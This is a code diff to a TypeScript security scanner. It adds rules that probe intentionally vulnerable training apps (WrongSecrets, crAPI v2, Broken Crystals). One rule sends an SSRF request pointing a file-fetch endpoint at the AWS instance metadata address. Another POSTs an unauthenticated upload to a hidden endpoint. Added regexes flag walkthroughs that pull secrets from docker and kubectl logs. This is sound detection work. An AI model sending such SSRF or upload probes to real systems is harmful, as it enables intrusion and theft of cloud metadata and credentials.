@@ -31003,6 +31003,18 @@ const wrongsecretsChallengeLiveOracle: Rule = async (ctx) => {
     {
       label: "Kubernetes configmap walkthrough",
       re: /K8s Configmap|config-map in the default namespace/i
+    },
+    {
+      label: "Docker container logs walkthrough",
+      re: /docker logs|find the value for challenge\s*8/i
+    },
+    {
+      label: "Kubernetes pod logs walkthrough",
+      re: /kubectl logs|grep secret/i
+    },
+    {
+      label: "Logging secrets walkthrough",
+      re: /challenge focuses on.*Logging|Logging<\/strong>/i
     }
   ]) {
     const m = doc.body.match(re);
@@ -31018,7 +31030,9 @@ const wrongsecretsChallengeLiveOracle: Rule = async (ctx) => {
           ? "Spring application.properties secrets"
           : /K8s Configmap/i.test(doc.body)
             ? "Kubernetes configmap secrets"
-            : "hardcoded secrets";
+            : /docker logs|kubectl logs|challenge focuses on.*Logging/i.test(doc.body)
+              ? "container/K8s log secrets"
+              : "hardcoded secrets";
   return {
     fired: true,
     confidence: markers.length >= 3 ? 0.92 : 0.9,
@@ -34828,6 +34842,116 @@ const brokencrystalsMassAssignmentPutLiveOracle: Rule = async (ctx) => {
   };
 };
 
+function isCrapi2Host(ctx: RuleContext): boolean {
+  return /crapi2\.apisec\.ai/i.test(ctx.origin);
+}
+
+const crapi2AuthLoginRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi2Host(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/identity\/api\/auth\/login/i.test(pageUrl)) return NEGATIVE;
+  const loginUrl = new URL("/identity/api/auth/login", ctx.origin).toString();
+  const jwt = await tryApiLabJwt(ctx);
+  if (!jwt) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      loginUrl,
+      tokenSample: `${jwt.slice(0, 16)}...`,
+      note: "crAPI v2 POST /identity/api/auth/login with demo credentials returns JWT — authentication oracle on route scan"
+    }
+  };
+};
+
+const crapi2ShopProductsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi2Host(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/workshop\/api\/shop\/products/i.test(pageUrl)) return NEGATIVE;
+  const productsUrl = new URL("/workshop/api/shop/products", ctx.origin).toString();
+  const doc = await ctx.probe.get(productsUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  const body = doc.body.trim();
+  const productsOk =
+    (/"products"\s*:\s*\[/.test(body) || /^\s*\[\s*\{/.test(body)) &&
+    /"id"\s*:/.test(body) &&
+    /"name"\s*:/.test(body);
+  if (!productsOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      url: productsUrl,
+      snippet: body.slice(0, 200).trim(),
+      note: "crAPI v2 GET /workshop/api/shop/products returns product catalog without authentication — OWASP API Top 10 training surface oracle"
+    }
+  };
+};
+
+const brokencrystalsFileAwsRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/file\/aws/i.test(pageUrl)) return NEGATIVE;
+  const probeUrl = new URL("/api/file/aws", ctx.origin);
+  probeUrl.searchParams.set("path", "http://169.254.169.254/latest/meta-data/");
+  probeUrl.searchParams.set("type", "image/jpg");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 4096 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const metadataOk =
+    /ami-id/i.test(doc.body) &&
+    /instance-id/i.test(doc.body) &&
+    /local-ipv4/i.test(doc.body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      url: probeUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Broken Crystals /api/file/aws route scan — GET with AWS metadata path returns IMDS ami-id/instance-id — cloud SSRF oracle"
+    }
+  };
+};
+
+const brokencrystalsHiddenUploadRouteLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/hidden-upload/i.test(pageUrl)) return NEGATIVE;
+  const uploadUrl = new URL("/api/hidden-upload", ctx.origin).toString();
+  const boundary = `----ThugirBcUpload${Date.now().toString(36)}`;
+  const fileContent = "\x89PNG\r\n\x1a\n";
+  const body = [
+    `--${boundary}`,
+    'Content-Disposition: form-data; name="file"; filename="probe.png"',
+    "Content-Type: image/png",
+    "",
+    fileContent,
+    `--${boundary}--`,
+    ""
+  ].join("\r\n");
+  const doc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body,
+    headers: { "Content-Type": `multipart/form-data; boundary=${boundary}` },
+    maxBytes: 4096
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!/"content"\s*:\s*"data:image\/png;base64,/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      url: uploadUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Broken Crystals /api/hidden-upload route scan — POST accepts image upload and returns base64 data URI without authentication"
+    }
+  };
+};
+
 const brokencrystalsAdminpermissionRouteLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
@@ -36800,6 +36924,10 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsMassAssignmentLiveOracle,
   brokencrystalsMassAssignmentPutLiveOracle,
   brokencrystalsAdminpermissionRouteLiveOracle,
+  brokencrystalsFileAwsRouteLiveOracle,
+  brokencrystalsHiddenUploadRouteLiveOracle,
+  crapi2AuthLoginRouteLiveOracle,
+  crapi2ShopProductsRouteLiveOracle,
   exposedApiConfig,
   sqliQueryParamInjection,
   sqliHeaderErrorDisclosure,
